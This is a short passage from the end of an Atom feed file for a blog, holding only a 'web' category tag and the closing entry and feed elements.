      <category term="web" scheme="http://gaufoo.com/tags/web/"/>
    
  </entry>
  
</feed>
